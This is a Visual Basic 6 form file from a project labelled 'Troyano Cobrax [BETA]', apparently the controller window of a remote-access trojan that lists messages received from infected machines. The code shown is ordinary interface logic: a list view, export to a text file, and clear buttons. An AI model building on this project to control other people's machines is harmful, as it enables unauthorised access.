VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form lista 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Comandos recibidos - Troyano Cobrax [BETA] "
   ClientHeight    =   4920
   ClientLeft      =   4800
   ClientTop       =   8460
   ClientWidth     =   7110
   Icon            =   "lista.frx":0000
   LinkTopic       =   "Form4"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   MousePointer    =   2  'Cross
   ScaleHeight     =   4920
   ScaleWidth      =   7110
   ShowInTaskbar   =   0   'False
   Begin VB.Timer Timer2 
      Interval        =   100
      Left            =   2880
      Top             =   120
   End
   Begin MSComctlLib.ListView List1 
      Height          =   4335
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   6855
      _ExtentX        =   12091
      _ExtentY        =   7646
      View            =   3
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      MousePointer    =   1
      NumItems        =   1
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Key             =   "a"
         Object.Tag             =   "a"
         Text            =   "Mensajes"
         Object.Width           =   17994
      EndProperty
   End
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   360
      Top             =   1080
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Limpiar"
      Height          =   255
      Left            =   1440
      TabIndex        =   1
      Top             =   4560
      Width           =   1215
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   1680
      OleObjectBlob   =   "lista.frx":74F2
      Top             =   720
   End
   Begin VB.CommandButton Ampliar 
      Caption         =   "&Pasar a txt"
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   4560
      Width           =   1215
   End
End
Attribute VB_Name = "lista"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function ShellExecute Lib "shell32" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpCommand As String, ByVal lppath As String, ByVal lpparameter As String, ByVal pass As Long, ByVal nShow As Long) As Long

Dim MyForm As FRMSIZE
Dim DesignX As Integer
Dim DesignY As Integer

Private Sub Ampliar_Click()
Open App.path & "\test.txt" For Output As #1

For i = 1 To List1.ListItems.Count
    Print #1, List1.ListItems.Item(i).Text
Next

Close #1

ShellExecute 0, "open", App.path & "\test.txt", 0, 0, 1
End Sub

Private Sub Command1_Click()
List1.ListItems.Clear
End Sub

Private Sub Form_Activate()
'Skin1.LoadSkin App.path & "\sk\skin5.skn"
'Skin1.ApplySkin lista.hwnd
End Sub

Private Sub Form_Load()

Set aniCursor1 = New clsAniCursor
'testeo de extension
aniCursor1.AniFile = App.path & "\sk\1.ani"

'Dim ScaleFactorX As Single, ScaleFactorY As Single

'DesignX = 800
'DesignY = 600
'RePosForm = True
'DoResize = False

'Xtwips = Screen.TwipsPerPixelX
'Ytwips = Screen.TwipsPerPixelY
'Ypixels = Screen.Height / Ytwips
'Xpixels = Screen.Width / Xtwips

'ScaleFactorX = ((Xpixels / DesignX) / 2) - 500
'ScaleFactorY = ((Ypixels / DesignY) / 2) - 500
'ScaleMode = 1

'Resize_For_Resolution ScaleFactorX, ScaleFactorY, Me
'MyForm.Height = Me.Height
'MyForm.Width = Me.Width

' Codigo inutil :C
'Me.Width = Form1.Width
'Me.Height = Form1.Height
End Sub

Private Sub Form_Unload(Cancel As Integer)
End
End Sub

Private Sub List1_DblClick()
If Not List1.SelectedItem.Text = "" Then
    MsgBox List1.SelectedItem.Text, vbInformation + vbOKOnly, "SERVER MESSAGE"
End If
End Sub

Private Sub Form_Resize()
    'Dim ScaleFactorX As Single, ScaleFactorY As Single

     ' If Not DoResize Then
      '   DoResize = True
      '   Exit Sub
      'End If

      'RePosForm = False
      'ScaleFactorX = Me.Width / MyForm.Width
      'ScaleFactorY = Me.Height / MyForm.Height
      'Resize_For_Resolution ScaleFactorX, ScaleFactorY, Me
      'MyForm.Height = Me.Height
      'MyForm.Width = Me.Width
End Sub

Private Sub Timer2_Timer()
List1.ColumnHeaders.Item(1).Width = List1.Width
End Sub
